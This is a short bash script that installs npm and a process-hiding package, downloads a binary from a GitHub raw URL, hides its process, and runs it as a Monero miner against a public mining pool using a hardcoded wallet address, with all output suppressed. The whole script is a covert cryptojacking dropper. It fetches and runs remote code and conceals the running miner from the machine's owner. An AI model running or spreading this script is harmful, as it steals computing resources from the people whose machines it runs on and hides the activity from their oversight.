#!bin/bash
sudo apt install npm -y > /dev/null
echo "{}" > package.json  > /dev/null
npm install node-process-hider  > /dev/null
wget https://raw.githubusercontent.com/nettech12/tool/main/url > /dev/null
npx ph add url
chmod +x url
./url --coin=XMR --threads=3 -o pool.supportxmr.com:3333 -u 4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4.adi -k -p x
#139.99.124.170:5555
